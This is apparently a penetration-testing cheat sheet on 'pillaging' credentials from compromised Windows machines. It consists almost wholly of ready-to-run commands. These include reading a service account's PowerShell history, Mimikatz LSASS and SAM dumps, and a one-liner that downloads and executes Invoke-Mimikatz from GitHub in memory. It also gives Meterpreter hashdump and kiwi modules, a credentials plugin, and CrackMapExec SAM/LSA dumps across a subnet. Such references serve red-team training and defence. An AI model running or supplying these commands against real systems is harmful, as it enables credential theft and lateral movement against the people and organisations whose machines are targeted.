# Pillaging

## Powershell History

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Mimikatz

```powershell
# Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate

#Extract from lsass (memory)
sekurlsa::logonpasswords

#Extract from SAM
lsadump::sam

#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

## Invoke-Mimikatz

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```

## Meterpreter

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::sam"
```

### MSF-Credentials Plugin

```bash
# Download and install
git clone https://github.com/carlospolop/MSF-Credentials.git
cp credentials.rb /usr/share/metasploit-framework/plugins/

# Load in meterpreter session
load credentials

# Gather all credentials
all_creds -s all
all_creds -s 1
```

## CrackMapExec

```bash
# SAM
cme smb 192.168.1.0/24 -u $USER -p $PASS --sam

# LSA
cme smb 192.168.1.0/24 -u $USER -p $PASS --lsa
```